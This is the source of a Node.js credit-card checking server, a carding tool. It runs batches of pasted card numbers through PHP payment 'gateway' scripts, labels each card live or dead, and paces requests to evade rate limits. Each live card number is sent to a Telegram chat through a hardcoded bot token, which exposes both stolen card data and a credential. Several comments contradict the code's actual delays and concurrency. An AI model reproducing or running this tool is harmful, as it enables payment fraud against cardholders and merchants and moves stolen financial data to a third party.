const express = require('express');
const socketIO = require('socket.io');
const http = require('http');
const path = require('path');
const fs = require('fs');
const async = require('async');
const { exec } = require('child_process');


const app = express();
const server = http.createServer(app);
const io = socketIO(server);

// Auto-detect PHP installation on Windows
let phpPath = 'php'; // Default to 'php' if in PATH

// Check common PHP installation paths on Windows
const commonPhpPaths = [
    'C:\\xampp\\php\\php.exe',
    'C:\\php\\php.exe',
    'C:\\wamp64\\bin\\php\\php8.2.0\\php.exe',
    'C:\\wamp64\\bin\\php\\php8.1.0\\php.exe',
    'C:\\wamp64\\bin\\php\\php8.0.0\\php.exe',
    'C:\\laragon\\bin\\php\\php-8.2\\php.exe',
    'C:\\laragon\\bin\\php\\php-8.1\\php.exe',
    'C:\\laragon\\bin\\php\\php-8.0\\php.exe'
];

// Try to find PHP
for (const testPath of commonPhpPaths) {
    if (fs.existsSync(testPath)) {
        phpPath = `"${testPath}"`; // Wrap in quotes for spaces
        console.log(`[*] Found PHP at: ${testPath}`);
        break;
    }
}

if (phpPath === 'php') {
    console.log('[*] Using PHP from system PATH');
} else {
    console.log(`[*] Using PHP: ${phpPath}`);
}

// @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg
// @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg
// @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg
const port = 6974;
let bins = [];
const waitForValue = async (valueGetter, interval = 100) => {
    return new Promise((resolve) => {
        const checkForValue = () => {
            const value = valueGetter();
            if (value !== null && value !== undefined) {
                clearInterval(intervalId);
                resolve(value);
            }
        };
        const intervalId = setInterval(checkForValue, interval);
        checkForValue();
    });
};
function log(message) {
    console.log(`[*] ${message}`)
}

function sanitizeCard(card) {
    // Remove any potentially dangerous characters and validate format
    const sanitized = card.replace(/[^0-9|]/g, '');
    
    // Split by pipe and validate each part
    const parts = sanitized.split('|');
    
    // Must have 3 or 4 parts: cc|mm|yy[yy] or cc|mm|yy[yy]|cvv
    if (parts.length < 3 || parts.length > 4) {
        throw new Error('Invalid card format. Expected: cc|mm|yy or cc|mm|yyyy');
    }
    
    const [cc, mm, yy, cvv] = parts;
    
    // Validate card number (13-19 digits)
    if (!cc || cc.length < 13 || cc.length > 19 || !/^\d+$/.test(cc)) {
        throw new Error('Invalid card number');
    }
    
    // Validate month (01-12)
    if (!mm || mm.length !== 2 || !/^(0[1-9]|1[0-2])$/.test(mm)) {
        throw new Error('Invalid month');
    }
    
    // Validate year (2 or 4 digits)
    if (!yy || (yy.length !== 2 && yy.length !== 4) || !/^\d+$/.test(yy)) {
        throw new Error('Invalid year');
    }
    
    // Convert 2-digit year to 4-digit for consistency
    const year = yy.length === 2 ? `20${yy}` : yy;
    
    // Validate CVV if present (3-4 digits)
    if (cvv && (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv))) {
        throw new Error('Invalid CVV');
    }
    
    // Return sanitized card in consistent format
    if (cvv) {
        return `${cc}|${mm}|${year.slice(-2)}|${cvv}`;
    } else {
        return `${cc}|${mm}|${year.slice(-2)}`;
    }
}

async function payment(card = '4895920372608330|04|2024', php, i) {
    log(php)

    try {
        // Sanitize and validate card input to prevent command injection
        const sanitizedCard = sanitizeCard(card);
        
        // Validate PHP file name to prevent path traversal
        if (!php || !/^[a-zA-Z0-9_-]+\.php$/.test(php)) {
            throw new Error('Invalid gateway file');
        }
        
        let execute = phpPath + ' ' + php + ' "' + sanitizedCard + '"';
        
        console.log('EXECUTING COMMAND:', execute); // Debug output
        
        return new Promise((resolve) => {
            exec(execute, { maxBuffer: 1024 * 1024 * 10 }, (err, stdout, stderr) => {
                console.log('COMMAND OUTPUT:', stdout); // Debug output
                if (stderr) console.log('COMMAND ERROR:', stderr); // Debug output
                
                try {
                    const result = JSON.parse(stdout);
                    resolve(result);
                } catch (e) {
                    console.log('JSON PARSE ERROR:', e.message);
                    console.log('RAW OUTPUT:', stdout);
                    resolve({
                        place: 'dead',
                        message: 'Processing Error - Invalid Response',
                        card: sanitizedCard
                    });
                }
            });
        });
    } catch (error) {
        console.log('INPUT VALIDATION ERROR:', error.message);
        return {
            place: 'dead',
            message: error.message,
            card: card
        };
    }
}
function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

io.on('connection', (socket) => {
    let stop = false, reuse = [];
    
    socket.on('cards', async (cards, php) => {
        stop = false;
        // Clean and validate cards with strict security checks
        var validCards = [];
        const cardLines = cards.replace(/\n\n/g, '').split("\n");
        
        for (let cardLine of cardLines) {
            const trimmedCard = cardLine.trim();
            if (!trimmedCard) continue;
            
            try {
                // Use our sanitization function to validate each card
                const sanitizedCard = sanitizeCard(trimmedCard);
                validCards.push(sanitizedCard);
            } catch (error) {
                // Log invalid cards but continue processing valid ones
                console.log(`Skipping invalid card: ${trimmedCard} - ${error.message}`);
            }
        }
        
        var cards = validCards;

        if (cards.length === 0) {
            socket.emit('message', 'No valid cards to process');
            return;
        }

        let cardsLength = cards.length, counter = 0;
        let identifier = 0;

        const queue = async.queue(async (card) => {
            if (stop) return;
            
            // Balanced delay for speed vs safety (5-8 seconds between cards)
            await sleep(Math.random() * 1000 + 1000);
            
            counter++;
            log('Checking ' + card + ' [' + counter + '/' + cardsLength + ']');
            
            try {
                if (!php) {
                    throw new Error('No gateway selected');
                }

                const pay = await payment(card, php, identifier);
                
                if (!pay || !pay.place || !pay.message) {
                    throw new Error('Invalid response format');
                }

                // Retry logic for 403 errors (rate limit)
                if (pay.message && pay.message.includes('403')) {
                    log('⚠️  Rate limited, waiting 20 seconds before retry...');
                    await sleep(1000); // Wait 20 seconds
                    
                    // Retry once
                    const retryPay = await payment(card, php, identifier);
                    if (retryPay && retryPay.place && retryPay.message) {
                        log('[' + counter + '/' + cardsLength + '] ' + card + ' => ' + retryPay.message + ' (retry)');
                        socket.emit('result', retryPay);
                        return;
                    }
                }

                // @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg @xgustavoph on tg
                if(pay.place == 'live') {
                    try {
                        await fetch('https://api.telegram.org/bot8425085073:AAGErMZC2VSRuOSAX3RjxC0r7nVDA563hu0/sendMessage?chat_id=-2076285821&text=Live ' + card);
                    } catch (error) {
                        console.log('Failed to send Telegram notification:', error);
                    }
                }

                log('[' + counter + '/' + cardsLength + '] ' + card + ' => ' + pay.message);
                socket.emit('result', pay);
            } catch (error) {
                console.log('Error processing card:', card, error);
                socket.emit('result', {
                    place: 'dead',
                    message: error.message || 'Processing Error',
                    card: card
                });
            }
        },2); // Must be 1 to avoid 403 errors - check one card at a time

        queue.push(cards);

        // Wait for all cards to be processed
        await queue.drain();
        log('Checking done!');
    });
    socket.on('disconnect', () => { stop = true });
    socket.on('stop', () => { stop = true; });
})

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/html/index.html'));
});
app.get('/js/app.js', (req, res) => {
    res.sendFile(path.join(__dirname, '/js/app.js'));
});
app.get('/php-files', (req, res) => {
    fs.readdir(__dirname, (err, files) => {
        if (err) {
            return res.status(500).send('Unable to scan directory');
        }
        const phpFiles = files.filter(file => path.extname(file) === '.php');
        res.json(phpFiles);
    });
});
server.listen(port, () => {
    log(`Server started on 0.0.0.0:${port}`);
})